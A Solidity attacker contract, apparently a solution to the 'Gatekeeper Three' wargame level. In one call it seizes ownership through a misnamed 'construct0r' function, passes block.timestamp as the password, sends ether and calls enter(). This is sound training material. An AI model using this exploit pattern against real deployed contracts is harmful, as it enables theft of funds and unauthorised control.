// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree} from "../contracts/28_GatekeeperThree.sol";

contract GatekeeperThreeAttacker {
    GatekeeperThree private gatekeeperThree;

    constructor(address _gatekeeperThreeAddress) {
        gatekeeperThree = GatekeeperThree(payable(_gatekeeperThreeAddress));
    }

    function attack() external payable {
        gatekeeperThree.construct0r();
        gatekeeperThree.trick().checkPassword(block.timestamp);
        gatekeeperThree.getAllowance(block.timestamp);
        (bool success, ) = payable(address(gatekeeperThree)).call{
            value: address(this).balance
        }("");

        if (!success) {
            revert();
        }

        gatekeeperThree.enter();
    }
}
